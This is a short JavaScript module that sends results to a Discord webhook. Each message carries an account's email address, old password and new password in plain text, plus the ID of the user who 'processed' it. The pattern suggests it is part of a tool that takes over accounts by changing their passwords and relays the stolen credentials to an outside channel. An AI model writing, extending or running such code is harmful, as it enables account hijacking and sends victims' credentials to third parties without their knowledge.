// ============================================================
//  Webhook sender — posts results to a Discord webhook
// ============================================================

const { COLORS } = require("../config");

async function sendToWebhook(webhookUrl, result) {
  if (!webhookUrl) return;

  const payload = {
    embeds: [
      {
        title: "Password Changed Successfully",
        color: COLORS.SUCCESS,
        fields: [
          { name: "Email", value: `\`${result.email}\``, inline: false },
          { name: "Old Password", value: `\`${result.oldPassword}\``, inline: true },
          { name: "New Password", value: `\`${result.newPassword}\``, inline: true },
        ],
        footer: { text: `Processed by User: ${result.userId || "Unknown"}` },
        timestamp: new Date().toISOString(),
      },
    ],
  };

  try {
    const res = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    if (res.ok || res.status === 204) {
      console.log(`[Webhook] Sent for ${result.email}`);
    } else {
      console.warn(`[Webhook] Failed: ${res.status}`);
    }
  } catch (err) {
    console.error(`[Webhook] Error: ${err.message}`);
  }
}

module.exports = { sendToWebhook };
